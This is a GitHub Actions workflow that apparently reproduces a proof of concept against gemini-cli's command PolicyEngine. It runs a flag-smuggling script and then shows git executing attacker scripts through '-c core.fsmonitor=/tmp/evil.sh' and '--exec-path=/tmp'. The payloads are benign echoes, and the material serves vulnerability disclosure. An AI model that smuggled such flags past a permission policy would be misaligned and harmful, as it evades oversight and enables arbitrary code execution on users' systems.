name: gemini-poc

on:
  workflow_dispatch:
  push:
    branches: [main]

jobs:
  reproduce:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout this repo
        uses: actions/checkout@v4

      - name: Clone gemini-cli
        run: |
          git clone https://github.com/google-gemini/gemini-cli.git gemini-cli
          echo "Commit: $(cd gemini-cli && git log -1 --format='%H')"

      - name: Install deps and tsx
        run: |
          cd gemini-cli/packages/core
          npm install 2>/dev/null | tail -3 || true
          npm install --no-save tsx

      - name: Copy PoC into correct location
        run: |
          cp poc_flag_smuggling.ts \
            gemini-cli/packages/core/src/policy/poc_flag_smuggling.ts

      - name: Part 1 - policy engine bypass (real PolicyEngine, real gemini-cli)
        run: |
          LOG="poc-results.log"
          {
            echo "======================================================================"
            echo "PART 1 -- PolicyEngine bypass (real code, real CI)"
            echo "======================================================================"
            echo "Commit: $(cd gemini-cli && git log -1 --format='%H')"
            echo "Date:   $(cd gemini-cli && git log -1 --format='%ci')"
            echo ""
          } | tee -a "$LOG"

          {
            echo "## gemini-poc results"
            echo '```'
          } >> "$GITHUB_STEP_SUMMARY"

          cd gemini-cli
          npx tsx packages/core/src/policy/poc_flag_smuggling.ts 2>&1 \
            | tee -a "../$LOG" \
            >> "$GITHUB_STEP_SUMMARY"
          cd ..

          echo '```' >> "$GITHUB_STEP_SUMMARY"

      - name: Part 2 - attacker script actually executes
        run: |
          LOG="poc-results.log"
          {
            echo ""
            echo "======================================================================"
            echo "PART 2 -- attacker script actually executes (not just a policy label)"
            echo "======================================================================"
          } | tee -a "$LOG"

          git init /tmp/testrepo 2>/dev/null
          cd /tmp/testrepo

          printf '#!/bin/sh\necho "[ATTACKER EXECUTED via core.fsmonitor] user=$(id -un) pwd=$(pwd)"\necho "[ATTACKER EXECUTED] This is real code execution triggered by git."\n' \
            > /tmp/evil.sh
          chmod +x /tmp/evil.sh

          echo "--- Running: git -c core.fsmonitor=/tmp/evil.sh status ---" \
            | tee -a "$GITHUB_WORKSPACE/$LOG"
          git -c core.fsmonitor=/tmp/evil.sh status 2>&1 \
            | tee -a "$GITHUB_WORKSPACE/$LOG" || true
          echo "" | tee -a "$GITHUB_WORKSPACE/$LOG"

          printf '#!/bin/sh\necho "[ATTACKER git-status EXECUTED via --exec-path] Replaced real git-status."\n' \
            > /tmp/git-status
          chmod +x /tmp/git-status

          echo "--- Running: git --exec-path=/tmp status ---" \
            | tee -a "$GITHUB_WORKSPACE/$LOG"
          git --exec-path=/tmp status 2>&1 \
            | tee -a "$GITHUB_WORKSPACE/$LOG" || true

      - name: Upload log
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: gemini-poc-results
          path: poc-results.log
